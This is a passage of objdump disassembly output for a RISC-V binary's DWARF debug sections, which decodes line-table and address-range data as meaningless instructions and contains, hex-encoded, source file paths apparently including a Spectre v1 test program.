 55a:	0005                	c.nop	1
 55c:	0b3a0e03          	lb	t3,179(s4)
 560:	0b390b3b          	0xb390b3b
 564:	1349                	addi	t1,t1,-14
 566:	1802                	slli	a6,a6,0x20
 568:	0000                	unimp
 56a:	03000533          	mul	a0,zero,a6
 56e:	3a08                	fld	fa0,48(a2)
 570:	390b3b0b          	0x390b3b0b
 574:	0213490b          	0x213490b
 578:	0018                	0x18
 57a:	3400                	fld	fs0,40(s0)
 57c:	0034                	addi	a3,sp,8
 57e:	0b3a0803          	lb	a6,179(s4)
 582:	0b390b3b          	0xb390b3b
 586:	1349                	addi	t1,t1,-14
 588:	1802                	slli	a6,a6,0x20
 58a:	0000                	unimp
 58c:	3435                	addiw	s0,s0,-19
 58e:	0300                	addi	s0,sp,384
 590:	3a08                	fld	fa0,48(a2)
 592:	390b3b0b          	0x390b3b0b
 596:	0013490b          	0x13490b
 59a:	3600                	fld	fs0,40(a2)
 59c:	000a                	c.slli	zero,0x2
 59e:	0b3a0e03          	lb	t3,179(s4)
 5a2:	0b390b3b          	0xb390b3b
 5a6:	0111                	addi	sp,sp,4
 5a8:	0000                	unimp
 5aa:	03000a37          	lui	s4,0x3000
 5ae:	3a0e                	fld	fs4,224(sp)
 5b0:	39053b0b          	0x39053b0b
 5b4:	0001110b          	0x1110b
 5b8:	3800                	fld	fs0,48(s0)
 5ba:	012e                	slli	sp,sp,0xb
 5bc:	0b3a0e03          	lb	t3,179(s4) # 30000b3 <_tbss_end+0x300002f>
 5c0:	0b390b3b          	0xb390b3b
 5c4:	13491927          	0x13491927
 5c8:	0111                	addi	sp,sp,4
 5ca:	0712                	slli	a4,a4,0x4
 5cc:	1840                	addi	s0,sp,52
 5ce:	01194297          	auipc	t0,0x1194
 5d2:	39000013          	li	zero,912
 5d6:	012e                	slli	sp,sp,0xb
 5d8:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 5e0:	0b39                	addi	s6,s6,14
 5e2:	01111927          	0x1111927
 5e6:	0712                	slli	a4,a4,0x4
 5e8:	1840                	addi	s0,sp,52
 5ea:	4296                	lw	t0,68(sp)
 5ec:	0119                	addi	sp,sp,6
 5ee:	3a000013          	li	zero,928
 5f2:	0034                	addi	a3,sp,8
 5f4:	0b3a0803          	lb	a6,179(s4)
 5f8:	0b390b3b          	0xb390b3b
 5fc:	1349                	addi	t1,t1,-14
 5fe:	0188                	addi	a0,sp,192
 600:	3b00000b          	0x3b00000b
 604:	0034                	addi	a3,sp,8
 606:	0b3a0e03          	lb	t3,179(s4)
 60a:	0b390b3b          	0xb390b3b
 60e:	1349                	addi	t1,t1,-14
 610:	0000                	unimp
 612:	343c                	fld	fa5,104(s0)
 614:	0300                	addi	s0,sp,384
 616:	3a08                	fld	fa0,48(a2)
 618:	390b3b0b          	0x390b3b0b
 61c:	8813490b          	0x8813490b
 620:	0b01                	addi	s6,s6,0
 622:	1802                	slli	a6,a6,0x20
 624:	0000                	unimp
 626:	2e3d                	addiw	t3,t3,15
 628:	0301                	addi	t1,t1,0
 62a:	3a0e                	fld	fs4,224(sp)
 62c:	390b3b0b          	0x390b3b0b
 630:	1201110b          	0x1201110b
 634:	96184007          	flq	ft0,-1695(a6)
 638:	1942                	slli	s2,s2,0x30
 63a:	1301                	addi	t1,t1,-32
 63c:	0000                	unimp
 63e:	2e3e                	fld	ft8,456(sp)
 640:	3f01                	addiw	t5,t5,-32
 642:	0319                	addi	t1,t1,6
 644:	3a0e                	fld	fs4,224(sp)
 646:	390b3b0b          	0x390b3b0b
 64a:	1119270b          	0x1119270b
 64e:	1201                	addi	tp,tp,-32
 650:	97184007          	flq	ft0,-1679(a6)
 654:	1942                	slli	s2,s2,0x30
 656:	1301                	addi	t1,t1,-32
 658:	0000                	unimp
 65a:	3f002e3f 3a0e0319 	0x3a0e03193f002e3f
 662:	390b3b0b          	0x390b3b0b
 666:	1201110b          	0x1201110b
 66a:	96184007          	flq	ft0,-1695(a6)
 66e:	1942                	slli	s2,s2,0x30
 670:	0000                	unimp
 672:	2e40                	fld	fs0,152(a2)
 674:	3f01                	addiw	t5,t5,-32
 676:	0319                	addi	t1,t1,6
 678:	3a0e                	fld	fs4,224(sp)
 67a:	390b3b0b          	0x390b3b0b
 67e:	8719270b          	0x8719270b
 682:	1901                	addi	s2,s2,-32
 684:	0111                	addi	sp,sp,4
 686:	0712                	slli	a4,a4,0x4
 688:	1840                	addi	s0,sp,52
 68a:	4296                	lw	t0,68(sp)
 68c:	0119                	addi	sp,sp,6
 68e:	41000013          	li	zero,1040
 692:	012e                	slli	sp,sp,0xb
 694:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 69c:	0b39                	addi	s6,s6,14
 69e:	01871927          	0x1871927
 6a2:	1119                	addi	sp,sp,-26
 6a4:	1201                	addi	tp,tp,-32
 6a6:	97184007          	flq	ft0,-1679(a6)
 6aa:	1942                	slli	s2,s2,0x30
 6ac:	1301                	addi	t1,t1,-32
 6ae:	0000                	unimp
 6b0:	3442                	fld	fs0,48(sp)
 6b2:	0300                	addi	s0,sp,384
 6b4:	3a0e                	fld	fs4,224(sp)
 6b6:	390b3b0b          	0x390b3b0b
 6ba:	8813490b          	0x8813490b
 6be:	0b01                	addi	s6,s6,0
 6c0:	1802                	slli	a6,a6,0x20
 6c2:	0000                	unimp
 6c4:	03012e43          	fmadd.d	ft8,ft2,fa6,ft0,rdn
 6c8:	3a0e                	fld	fs4,224(sp)
 6ca:	390b3b0b          	0x390b3b0b
 6ce:	1119270b          	0x1119270b
 6d2:	1201                	addi	tp,tp,-32
 6d4:	97184007          	flq	ft0,-1679(a6)
 6d8:	1942                	slli	s2,s2,0x30
 6da:	1301                	addi	t1,t1,-32
 6dc:	0000                	unimp
 6de:	2e44                	fld	fs1,152(a2)
 6e0:	0301                	addi	t1,t1,0
 6e2:	3a0e                	fld	fs4,224(sp)
 6e4:	390b3b0b          	0x390b3b0b
 6e8:	1119270b          	0x1119270b
 6ec:	1201                	addi	tp,tp,-32
 6ee:	97184007          	flq	ft0,-1679(a6)
 6f2:	1942                	slli	s2,s2,0x30
 6f4:	0000                	unimp
	...

Disassembly of section .debug_aranges:

0000000000000000 <.debug_aranges>:
   0:	002c                	addi	a1,sp,8
   2:	0000                	unimp
   4:	0002                	c.slli	zero,0x0
   6:	0000                	unimp
   8:	0000                	unimp
   a:	0008                	0x8
   c:	0000                	unimp
   e:	0000                	unimp
  10:	1048                	addi	a0,sp,36
  12:	8000                	0x8000
  14:	0000                	unimp
  16:	0000                	unimp
  18:	0586                	slli	a1,a1,0x1
	...
  2e:	0000                	unimp
  30:	002c                	addi	a1,sp,8
  32:	0000                	unimp
  34:	0002                	c.slli	zero,0x0
  36:	00000d97          	auipc	s11,0x0
  3a:	0008                	0x8
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	0000                	unimp
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	01c6                	slli	gp,gp,0x11
	...
  5e:	0000                	unimp
  60:	002c                	addi	a1,sp,8
  62:	0000                	unimp
  64:	0002                	c.slli	zero,0x0
  66:	0dc5                	addi	s11,s11,17
  68:	0000                	unimp
  6a:	0008                	0x8
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	15ce                	slli	a1,a1,0x33
  72:	8000                	0x8000
  74:	0000                	unimp
  76:	0000                	unimp
  78:	002e                	c.slli	zero,0xb
	...
  8e:	0000                	unimp
  90:	002c                	addi	a1,sp,8
  92:	0000                	unimp
  94:	0002                	c.slli	zero,0x0
  96:	00000df3          	0xdf3
  9a:	0008                	0x8
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	15fc                	addi	a5,sp,748
  a2:	8000                	0x8000
  a4:	0000                	unimp
  a6:	0000                	unimp
  a8:	1214                	addi	a3,sp,288
	...

Disassembly of section .debug_line:

0000000000000000 <.debug_line>:
       0:	045c                	addi	a5,sp,516
       2:	0000                	unimp
       4:	0002                	c.slli	zero,0x0
       6:	014e                	slli	sp,sp,0x13
       8:	0000                	unimp
       a:	0101                	addi	sp,sp,0
       c:	000d0efb          	0xd0efb
      10:	0101                	addi	sp,sp,0
      12:	0101                	addi	sp,sp,0
      14:	0000                	unimp
      16:	0100                	addi	s0,sp,128
      18:	0000                	unimp
      1a:	6901                	0x6901
      1c:	636e                	ld	t1,216(sp)
      1e:	7300                	ld	s0,32(a4)
      20:	6372                	ld	t1,280(sp)
      22:	2f00                	fld	fs0,24(a4)
      24:	2f74706f          	j	47b1a <_tbss_end+0x47a96>
      28:	6972                	ld	s2,280(sp)
      2a:	36766373          	csrrsi	t1,0x367,12
      2e:	2f34                	fld	fa3,88(a4)
      30:	6972                	ld	s2,280(sp)
      32:	36766373          	csrrsi	t1,0x367,12
      36:	2d34                	fld	fa3,88(a0)
      38:	6e75                	lui	t3,0x1d
      3a:	776f6e6b          	0x776f6e6b
      3e:	2d6e                	fld	fs10,216(sp)
      40:	6c65                	lui	s8,0x19
      42:	2f66                	fld	ft10,88(sp)
      44:	6e69                	lui	t3,0x1a
      46:	64756c63          	bltu	a0,t2,69e <_tbss_end+0x61a>
      4a:	2f65                	addiw	t5,t5,25
      4c:	616d                	addi	sp,sp,240
      4e:	6e696863          	bltu	s2,t1,73e <_tbss_end+0x6ba>
      52:	0065                	c.nop	25
      54:	74706f2f          	0x74706f2f
      58:	7369722f          	0x7369722f
      5c:	34367663          	bleu	gp,a2,3a8 <_tbss_end+0x324>
      60:	7369722f          	0x7369722f
      64:	34367663          	bleu	gp,a2,3b0 <_tbss_end+0x32c>
      68:	752d                	lui	a0,0xfffeb
      6a:	6b6e                	ld	s6,216(sp)
      6c:	6f6e                	ld	t5,216(sp)
      6e:	652d6e77          	0x652d6e77
      72:	666c                	ld	a1,200(a2)
      74:	636e692f          	0x636e692f
      78:	756c                	ld	a1,232(a0)
      7a:	6564                	ld	s1,200(a0)
      7c:	7379732f          	0x7379732f
      80:	2f00                	fld	fs0,24(a4)
      82:	2f74706f          	j	47b78 <_tbss_end+0x47af4>
      86:	6972                	ld	s2,280(sp)
      88:	36766373          	csrrsi	t1,0x367,12
      8c:	2f34                	fld	fa3,88(a4)
      8e:	696c                	ld	a1,208(a0)
      90:	2f62                	fld	ft10,24(sp)
      92:	2f636367          	0x2f636367
      96:	6972                	ld	s2,280(sp)
      98:	36766373          	csrrsi	t1,0x367,12
      9c:	2d34                	fld	fa3,88(a0)
      9e:	6e75                	lui	t3,0x1d
      a0:	776f6e6b          	0x776f6e6b
      a4:	2d6e                	fld	fs10,216(sp)
      a6:	6c65                	lui	s8,0x19
      a8:	2f66                	fld	ft10,88(sp)
      aa:	2e322e37          	lui	t3,0x2e322
      ae:	2f30                	fld	fa2,88(a4)
      b0:	6e69                	lui	t3,0x1a
      b2:	64756c63          	bltu	a0,t2,70a <_tbss_end+0x686>
      b6:	0065                	c.nop	25
      b8:	74706f2f          	0x74706f2f
      bc:	7369722f          	0x7369722f
      c0:	34367663          	bleu	gp,a2,40c <_tbss_end+0x388>
      c4:	7369722f          	0x7369722f
      c8:	34367663          	bleu	gp,a2,414 <_tbss_end+0x390>
      cc:	752d                	lui	a0,0xfffeb
      ce:	6b6e                	ld	s6,216(sp)
      d0:	6f6e                	ld	t5,216(sp)
      d2:	652d6e77          	0x652d6e77
      d6:	666c                	ld	a1,200(a2)
      d8:	636e692f          	0x636e692f
      dc:	756c                	ld	a1,232(a0)
      de:	6564                	ld	s1,200(a0)
      e0:	0000                	unimp
      e2:	68636163          	bltu	t1,t1,764 <_tbss_end+0x6e0>
      e6:	2e65                	addiw	t3,t3,25
      e8:	0068                	addi	a0,sp,12
      ea:	0001                	nop
      ec:	7300                	ld	s0,32(a4)
      ee:	6570                	ld	a2,200(a0)
      f0:	65727463          	bleu	s7,tp,738 <_tbss_end+0x6b4>
      f4:	762d                	lui	a2,0xfffeb
      f6:	2e31                	addiw	t3,t3,12
      f8:	00020063          	beqz	tp,f8 <_tbss_end+0x74>
      fc:	5f00                	lw	s0,56(a4)
      fe:	6564                	ld	s1,200(a0)
     100:	6166                	ld	sp,88(sp)
     102:	6c75                	lui	s8,0x1d
     104:	5f74                	lw	a3,124(a4)
     106:	7974                	ld	a3,240(a0)
     108:	6570                	ld	a2,200(a0)
     10a:	00682e73          	csrrs	t3,0x6,a6
     10e:	6c000003          	lb	zero,1728(zero) # 6c0 <_tbss_end+0x63c>
     112:	2e6b636f          	jal	t1,b63f8 <_tbss_end+0xb6374>
     116:	0068                	addi	a0,sp,12
     118:	0004                	0x4
     11a:	5f00                	lw	s0,56(a4)
     11c:	7974                	ld	a3,240(a0)
     11e:	6570                	ld	a2,200(a0)
     120:	00682e73          	csrrs	t3,0x6,a6
     124:	0004                	0x4
     126:	7300                	ld	s0,32(a4)
     128:	6474                	ld	a3,200(s0)
     12a:	6564                	ld	s1,200(a0)
     12c:	2e66                	fld	ft8,88(sp)
     12e:	0068                	addi	a0,sp,12
     130:	0005                	c.nop	1
     132:	7200                	ld	s0,32(a2)
     134:	6565                	lui	a0,0x19
     136:	746e                	ld	s0,248(sp)
     138:	682e                	ld	a6,200(sp)
     13a:	0400                	addi	s0,sp,512
     13c:	0000                	unimp
     13e:	735f 6474 6e69      	0x6e696474735f
     144:	2e74                	fld	fa3,216(a2)
     146:	0068                	addi	a0,sp,12
     148:	0004                	0x4
     14a:	7300                	ld	s0,32(a4)
     14c:	6474                	ld	a3,200(s0)
     14e:	696c                	ld	a1,208(a0)
     150:	2e62                	fld	ft8,24(sp)
     152:	0068                	addi	a0,sp,12
     154:	0006                	c.slli	zero,0x1
     156:	0000                	unimp
     158:	0900                	addi	s0,sp,144
     15a:	4802                	lw	a6,0(sp)
     15c:	0010                	0x10
     15e:	0080                	addi	s0,sp,64
     160:	0000                	unimp
     162:	0300                	addi	s0,sp,384
     164:	00c6                	slli	ra,ra,0x11
     166:	0301                	addi	t1,t1,0
     168:	0905                	addi	s2,s2,1
     16a:	000e                	c.slli	zero,0x3
     16c:	0301                	addi	t1,t1,0
     16e:	0901                	addi	s2,s2,0
     170:	000a                	c.slli	zero,0x2
     172:	0301                	addi	t1,t1,0
     174:	0902                	slli	s2,s2,0x0
     176:	000a                	c.slli	zero,0x2
     178:	0301                	addi	t1,t1,0
     17a:	000a0903          	lb	s2,0(s4)
     17e:	0301                	addi	t1,t1,0
     180:	000c0903          	lb	s2,0(s8) # 1d000 <_tbss_end+0x1cf7c>
     184:	0301                	addi	t1,t1,0
     186:	0906                	slli	s2,s2,0x1
     188:	0008                	0x8
     18a:	0301                	addi	t1,t1,0
     18c:	0906                	slli	s2,s2,0x1
     18e:	0004                	0x4
     190:	0301                	addi	t1,t1,0
     192:	00140903          	lb	s2,1(s0) # fffffffffffe0001 <_end+0xffffffff7ffc4b41>
     196:	0301                	addi	t1,t1,0
     198:	00060903          	lb	s2,0(a2) # fffffffffffeb000 <_end+0xffffffff7ffcfb40>
     19c:	0301                	addi	t1,t1,0
     19e:	0904                	addi	s1,sp,144
     1a0:	0016                	c.slli	zero,0x5
     1a2:	0001                	nop
     1a4:	0402                	slli	s0,s0,0x0
     1a6:	09030303          	lb	t1,144(t1)
     1aa:	0006                	c.slli	zero,0x1
     1ac:	0001                	nop
     1ae:	0402                	slli	s0,s0,0x0
     1b0:	09040303          	lb	t1,144(s0)
     1b4:	000a                	c.slli	zero,0x2
     1b6:	0001                	nop
     1b8:	0402                	slli	s0,s0,0x0
     1ba:	09790303          	lb	t1,151(s2) # 6591 <_tbss_end+0x650d>
     1be:	0018                	0x18
     1c0:	0001                	nop
     1c2:	0402                	slli	s0,s0,0x0
     1c4:	0601                	addi	a2,a2,0
     1c6:	0a090003          	lb	zero,160(s2)
     1ca:	0100                	addi	s0,sp,128
     1cc:	0200                	addi	s0,sp,256
     1ce:	0204                	addi	s1,sp,256
     1d0:	0306                	slli	t1,t1,0x1
     1d2:	0979                	addi	s2,s2,30
     1d4:	000a                	c.slli	zero,0x2
     1d6:	0001                	nop
     1d8:	0402                	slli	s0,s0,0x0
     1da:	0601                	addi	a2,a2,0
     1dc:	0a090003          	lb	zero,160(s2)
     1e0:	0100                	addi	s0,sp,128
     1e2:	0306                	slli	t1,t1,0x1
     1e4:	0912                	slli	s2,s2,0x4
     1e6:	000c                	0xc
     1e8:	0401                	addi	s0,s0,0
     1ea:	0302                	slli	t1,t1,0x0
     1ec:	7fac                	ld	a1,120(a5)
     1ee:	0809                	addi	a6,a6,2
     1f0:	0100                	addi	s0,sp,128
     1f2:	16090103          	lb	sp,352(s2)
     1f6:	0100                	addi	s0,sp,128
     1f8:	08090103          	lb	sp,128(s2)
     1fc:	0100                	addi	s0,sp,128
     1fe:	0a090203          	lb	tp,160(s2)
     202:	0100                	addi	s0,sp,128
     204:	06090103          	lb	sp,96(s2)
     208:	0100                	addi	s0,sp,128
     20a:	18090103          	lb	sp,384(s2)
     20e:	0100                	addi	s0,sp,128
     210:	0e090103          	lb	sp,224(s2)
     214:	0100                	addi	s0,sp,128
     216:	14090103          	lb	sp,320(s2)
     21a:	0100                	addi	s0,sp,128
     21c:	12090103          	lb	sp,288(s2)
     220:	0100                	addi	s0,sp,128
     222:	12090203          	lb	tp,288(s2)
     226:	0100                	addi	s0,sp,128
     228:	1a090103          	lb	sp,416(s2)
     22c:	0100                	addi	s0,sp,128
     22e:	16090103          	lb	sp,352(s2)
     232:	0100                	addi	s0,sp,128
     234:	0200                	addi	s0,sp,256
     236:	0204                	addi	s1,sp,256
     238:	12097703          	0x12097703
     23c:	0100                	addi	s0,sp,128
     23e:	0200                	addi	s0,sp,256
     240:	0104                	addi	s1,sp,128
     242:	0306                	slli	t1,t1,0x1
     244:	0900                	addi	s0,sp,144
     246:	000a                	c.slli	zero,0x2
     248:	0601                	addi	a2,a2,0
     24a:	0c090c03          	lb	s8,192(s2)
     24e:	0100                	addi	s0,sp,128
     250:	08090803          	lb	a6,128(s2)
     254:	0100                	addi	s0,sp,128
     256:	0a090103          	lb	sp,160(s2)
     25a:	0100                	addi	s0,sp,128
     25c:	06090303          	lb	t1,96(s2)
     260:	0100                	addi	s0,sp,128
     262:	18090103          	lb	sp,384(s2)
     266:	0100                	addi	s0,sp,128
     268:	34090b03          	lb	s6,832(s2)
     26c:	0100                	addi	s0,sp,128
     26e:	12090103          	lb	sp,288(s2)
     272:	0100                	addi	s0,sp,128
     274:	2c090403          	lb	s0,704(s2)
     278:	0100                	addi	s0,sp,128
     27a:	10090103          	lb	sp,256(s2)
     27e:	0100                	addi	s0,sp,128
     280:	08090203          	lb	tp,128(s2)
     284:	0100                	addi	s0,sp,128
     286:	08090103          	lb	sp,128(s2)
     28a:	0100                	addi	s0,sp,128
     28c:	1c090203          	lb	tp,448(s2)
     290:	0100                	addi	s0,sp,128
     292:	04090903          	lb	s2,64(s2)
     296:	0100                	addi	s0,sp,128
     298:	0c090103          	lb	sp,192(s2)
     29c:	0100                	addi	s0,sp,128
     29e:	18090303          	lb	t1,384(s2)
     2a2:	0100                	addi	s0,sp,128
     2a4:	06090303          	lb	t1,96(s2)
     2a8:	0100                	addi	s0,sp,128
     2aa:	0200                	addi	s0,sp,256
     2ac:	0304                	addi	s1,sp,384
     2ae:	06090103          	lb	sp,96(s2)
     2b2:	0100                	addi	s0,sp,128
     2b4:	0200                	addi	s0,sp,256
     2b6:	0304                	addi	s1,sp,384
     2b8:	14097f03          	0x14097f03
     2bc:	0100                	addi	s0,sp,128
     2be:	0200                	addi	s0,sp,256
     2c0:	0104                	addi	s1,sp,128
     2c2:	0306                	slli	t1,t1,0x1
     2c4:	0900                	addi	s0,sp,144
     2c6:	000a                	c.slli	zero,0x2
     2c8:	0601                	addi	a2,a2,0
     2ca:	0c090503          	lb	a0,192(s2)
     2ce:	0100                	addi	s0,sp,128
     2d0:	06090303          	lb	t1,96(s2)
     2d4:	0100                	addi	s0,sp,128
     2d6:	10090203          	lb	tp,256(s2)
     2da:	0100                	addi	s0,sp,128
     2dc:	08090503          	lb	a0,128(s2)
     2e0:	0100                	addi	s0,sp,128
     2e2:	16090103          	lb	sp,352(s2)
     2e6:	0100                	addi	s0,sp,128
     2e8:	16090103          	lb	sp,352(s2)
     2ec:	0100                	addi	s0,sp,128
     2ee:	10090103          	lb	sp,256(s2)
     2f2:	0100                	addi	s0,sp,128
     2f4:	1a090303          	lb	t1,416(s2)
     2f8:	0100                	addi	s0,sp,128
     2fa:	0200                	addi	s0,sp,256
     2fc:	0304                	addi	s1,sp,384
     2fe:	06090103          	lb	sp,96(s2)
     302:	0100                	addi	s0,sp,128
     304:	0200                	addi	s0,sp,256
     306:	0304                	addi	s1,sp,384
     308:	00097f03          	0x97f03
     30c:	0100                	addi	s0,sp,128
     30e:	0200                	addi	s0,sp,256
     310:	0104                	addi	s1,sp,128
     312:	0306                	slli	t1,t1,0x1
     314:	0900                	addi	s0,sp,144
     316:	000a                	c.slli	zero,0x2
     318:	0001                	nop
     31a:	0402                	slli	s0,s0,0x0
     31c:	0602                	slli	a2,a2,0x0
     31e:	0c090503          	lb	a0,192(s2)
     322:	0100                	addi	s0,sp,128
     324:	0200                	addi	s0,sp,256
     326:	0204                	addi	s1,sp,256
     328:	08097003          	0x8097003
     32c:	0100                	addi	s0,sp,128
     32e:	0200                	addi	s0,sp,256
     330:	0104                	addi	s1,sp,128
     332:	0306                	slli	t1,t1,0x1
     334:	0900                	addi	s0,sp,144
     336:	000a                	c.slli	zero,0x2
     338:	0601                	addi	a2,a2,0
     33a:	08091703          	lh	a4,128(s2)
     33e:	0100                	addi	s0,sp,128
     340:	06090103          	lb	sp,96(s2)
     344:	0100                	addi	s0,sp,128
     346:	04090103          	lb	sp,64(s2)
     34a:	0100                	addi	s0,sp,128
     34c:	10090103          	lb	sp,256(s2)
     350:	0100                	addi	s0,sp,128
     352:	1e090103          	lb	sp,480(s2)
     356:	0100                	addi	s0,sp,128
     358:	18090303          	lb	t1,384(s2)
     35c:	0100                	addi	s0,sp,128
     35e:	0c090103          	lb	sp,192(s2)
     362:	0100                	addi	s0,sp,128
     364:	0200                	addi	s0,sp,256
     366:	0204                	addi	s1,sp,256
     368:	28097803          	0x28097803
     36c:	0100                	addi	s0,sp,128
     36e:	0200                	addi	s0,sp,256
     370:	0104                	addi	s1,sp,128
     372:	0306                	slli	t1,t1,0x1
     374:	0900                	addi	s0,sp,144
     376:	000a                	c.slli	zero,0x2
     378:	0001                	nop
     37a:	0402                	slli	s0,s0,0x0
     37c:	0602                	slli	a2,a2,0x0
     37e:	0c096403          	lwu	s0,192(s2)
     382:	0100                	addi	s0,sp,128
     384:	0200                	addi	s0,sp,256
     386:	0104                	addi	s1,sp,128
     388:	0306                	slli	t1,t1,0x1
     38a:	0900                	addi	s0,sp,144
     38c:	000a                	c.slli	zero,0x2
     38e:	0601                	addi	a2,a2,0
     390:	0a092e03          	lw	t3,160(s2)
     394:	0100                	addi	s0,sp,128
     396:	1c090203          	lb	tp,448(s2)
     39a:	0100                	addi	s0,sp,128
     39c:	0200                	addi	s0,sp,256
     39e:	0104                	addi	s1,sp,128
     3a0:	0306                	slli	t1,t1,0x1
     3a2:	0900                	addi	s0,sp,144
     3a4:	001e                	c.slli	zero,0x7
     3a6:	0601                	addi	a2,a2,0
     3a8:	1e090103          	lb	sp,480(s2)
     3ac:	0100                	addi	s0,sp,128
     3ae:	10090103          	lb	sp,256(s2)
     3b2:	0100                	addi	s0,sp,128
     3b4:	14097f03          	0x14097f03
     3b8:	0100                	addi	s0,sp,128
     3ba:	08090103          	lb	sp,128(s2)
     3be:	0100                	addi	s0,sp,128
     3c0:	04097f03          	0x4097f03
     3c4:	0100                	addi	s0,sp,128
     3c6:	04090103          	lb	sp,64(s2)
     3ca:	0100                	addi	s0,sp,128
     3cc:	04097f03          	0x4097f03
     3d0:	0100                	addi	s0,sp,128
     3d2:	08090203          	lb	tp,128(s2)
     3d6:	0100                	addi	s0,sp,128
     3d8:	04097e03          	0x4097e03
     3dc:	0100                	addi	s0,sp,128
     3de:	04090203          	lb	tp,64(s2)
     3e2:	0100                	addi	s0,sp,128
     3e4:	04097e03          	0x4097e03
     3e8:	0100                	addi	s0,sp,128
     3ea:	14090403          	lb	s0,320(s2)
     3ee:	0100                	addi	s0,sp,128
     3f0:	10090103          	lb	sp,256(s2)
     3f4:	0100                	addi	s0,sp,128
     3f6:	14097f03          	0x14097f03
     3fa:	0100                	addi	s0,sp,128
     3fc:	08090103          	lb	sp,128(s2)
     400:	0100                	addi	s0,sp,128
     402:	04097f03          	0x4097f03
     406:	0100                	addi	s0,sp,128
     408:	04090103          	lb	sp,64(s2)
     40c:	0100                	addi	s0,sp,128
     40e:	04097f03          	0x4097f03
     412:	0100                	addi	s0,sp,128
     414:	08090203          	lb	tp,128(s2)
     418:	0100                	addi	s0,sp,128
     41a:	04097e03          	0x4097e03
     41e:	0100                	addi	s0,sp,128
     420:	04090203          	lb	tp,64(s2)
     424:	0100                	addi	s0,sp,128
     426:	04097e03          	0x4097e03
     42a:	0100                	addi	s0,sp,128
     42c:	0200                	addi	s0,sp,256
     42e:	0204                	addi	s1,sp,256
     430:	12090503          	lb	a0,288(s2)
     434:	0100                	addi	s0,sp,128
     436:	0200                	addi	s0,sp,256
     438:	0204                	addi	s1,sp,256
     43a:	097fbe03          	ld	t3,151(t6)
     43e:	000a                	c.slli	zero,0x2
     440:	0001                	nop
     442:	0402                	slli	s0,s0,0x0
     444:	0601                	addi	a2,a2,0
     446:	0a090003          	lb	zero,160(s2)
     44a:	0100                	addi	s0,sp,128
     44c:	0306                	slli	t1,t1,0x1
     44e:	00c5                	addi	ra,ra,17
     450:	0a09                	addi	s4,s4,2
     452:	0100                	addi	s0,sp,128
     454:	02090103          	lb	sp,32(s2)
     458:	0100                	addi	s0,sp,128
     45a:	0a09                	addi	s4,s4,2
     45c:	0000                	unimp
     45e:	0101                	addi	sp,sp,0
     460:	03f4                	addi	a3,sp,460
     462:	0000                	unimp
     464:	0002                	c.slli	zero,0x0
     466:	0020                	addi	s0,sp,8
     468:	0000                	unimp
     46a:	0101                	addi	sp,sp,0
     46c:	000d0efb          	0xd0efb
     470:	0101                	addi	sp,sp,0
     472:	0101                	addi	sp,sp,0
     474:	0000                	unimp
     476:	0100                	addi	s0,sp,128
     478:	0000                	unimp
     47a:	7301                	lui	t1,0xfffe0
     47c:	6372                	ld	t1,280(sp)
     47e:	0000                	unimp
     480:	2e747263          	bleu	t2,s0,764 <_tbss_end+0x6e0>
     484:	00010053          	fadd.s	ft0,ft2,ft0,rne
     488:	0000                	unimp
     48a:	0900                	addi	s0,sp,144
     48c:	0002                	c.slli	zero,0x0
     48e:	0000                	unimp
     490:	0080                	addi	s0,sp,64
     492:	0000                	unimp
     494:	0300                	addi	s0,sp,384
     496:	0111                	addi	sp,sp,4
     498:	02090103          	lb	sp,32(s2)
     49c:	0100                	addi	s0,sp,128
     49e:	02090103          	lb	sp,32(s2)
     4a2:	0100                	addi	s0,sp,128
     4a4:	02090103          	lb	sp,32(s2)
     4a8:	0100                	addi	s0,sp,128
     4aa:	02090103          	lb	sp,32(s2)
     4ae:	0100                	addi	s0,sp,128
     4b0:	02090103          	lb	sp,32(s2)
     4b4:	0100                	addi	s0,sp,128
     4b6:	02090103          	lb	sp,32(s2)
     4ba:	0100                	addi	s0,sp,128
     4bc:	02090103          	lb	sp,32(s2)
     4c0:	0100                	addi	s0,sp,128
     4c2:	02090103          	lb	sp,32(s2)
     4c6:	0100                	addi	s0,sp,128
     4c8:	02090103          	lb	sp,32(s2)
     4cc:	0100                	addi	s0,sp,128
     4ce:	02090103          	lb	sp,32(s2)
     4d2:	0100                	addi	s0,sp,128
     4d4:	02090103          	lb	sp,32(s2)
     4d8:	0100                	addi	s0,sp,128
     4da:	02090103          	lb	sp,32(s2)
     4de:	0100                	addi	s0,sp,128
     4e0:	02090103          	lb	sp,32(s2)
     4e4:	0100                	addi	s0,sp,128
     4e6:	02090103          	lb	sp,32(s2)
     4ea:	0100                	addi	s0,sp,128
     4ec:	02090103          	lb	sp,32(s2)
     4f0:	0100                	addi	s0,sp,128
     4f2:	02090103          	lb	sp,32(s2)
     4f6:	0100                	addi	s0,sp,128
     4f8:	02090103          	lb	sp,32(s2)
     4fc:	0100                	addi	s0,sp,128
     4fe:	02090103          	lb	sp,32(s2)
     502:	0100                	addi	s0,sp,128
     504:	02090103          	lb	sp,32(s2)
     508:	0100                	addi	s0,sp,128
     50a:	02090103          	lb	sp,32(s2)
     50e:	0100                	addi	s0,sp,128
     510:	02090103          	lb	sp,32(s2)
     514:	0100                	addi	s0,sp,128
     516:	02090103          	lb	sp,32(s2)
     51a:	0100                	addi	s0,sp,128
     51c:	02090103          	lb	sp,32(s2)
     520:	0100                	addi	s0,sp,128
     522:	02090103          	lb	sp,32(s2)
     526:	0100                	addi	s0,sp,128
     528:	02090103          	lb	sp,32(s2)
     52c:	0100                	addi	s0,sp,128
     52e:	02090103          	lb	sp,32(s2)
     532:	0100                	addi	s0,sp,128
     534:	02090103          	lb	sp,32(s2)
     538:	0100                	addi	s0,sp,128
     53a:	02090103          	lb	sp,32(s2)
     53e:	0100                	addi	s0,sp,128
     540:	02090103          	lb	sp,32(s2)
     544:	0100                	addi	s0,sp,128
     546:	02090103          	lb	sp,32(s2)
     54a:	0100                	addi	s0,sp,128
     54c:	02090303          	lb	t1,32(s2)
     550:	0100                	addi	s0,sp,128
     552:	02090103          	lb	sp,32(s2)
     556:	0100                	addi	s0,sp,128
     558:	04090303          	lb	t1,64(s2)
     55c:	0100                	addi	s0,sp,128
     55e:	02090203          	lb	tp,32(s2)
     562:	0100                	addi	s0,sp,128
     564:	02090303          	lb	t1,32(s2)
     568:	0100                	addi	s0,sp,128
